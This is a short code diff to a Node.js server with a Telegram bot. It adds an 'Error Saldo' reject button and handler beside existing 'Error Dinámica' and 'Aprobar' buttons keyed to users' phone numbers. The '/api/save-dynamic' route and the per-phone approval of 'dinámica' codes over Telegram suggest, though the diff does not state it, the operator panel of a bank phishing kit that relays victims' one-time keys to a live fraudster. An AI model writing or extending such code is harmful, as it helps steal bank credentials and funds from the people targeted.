@@ -204,6 +204,9 @@ app.post('/api/save-dynamic', (req, res) => {
                     { text: '❌ Error Dinámica', callback_data: `reject_dynamic_${celular}` }
                 ],
                 [
+                     { text: '❌ Error Saldo', callback_data: `reject_saldo_${celular}` }
+                ],
+                [
                      { text: '✅ Aprobar', callback_data: `approve_dynamic_${celular}` }
                 ]
             ]
@@ -301,6 +304,9 @@ bot.on('callback_query', (callbackQuery) => {
         } else if (type === 'dynamic') {
             userSessions[celular].status = 'rejected_dynamic';
             bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de dinámica.`);
+        } else if (type === 'saldo') {
+            userSessions[celular].status = 'rejected_saldo';
+            bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de saldo.`);
         }
     } else {
         bot.sendMessage(chatId, `⚠️ No se encontró sesión activa para ${celular}.`);
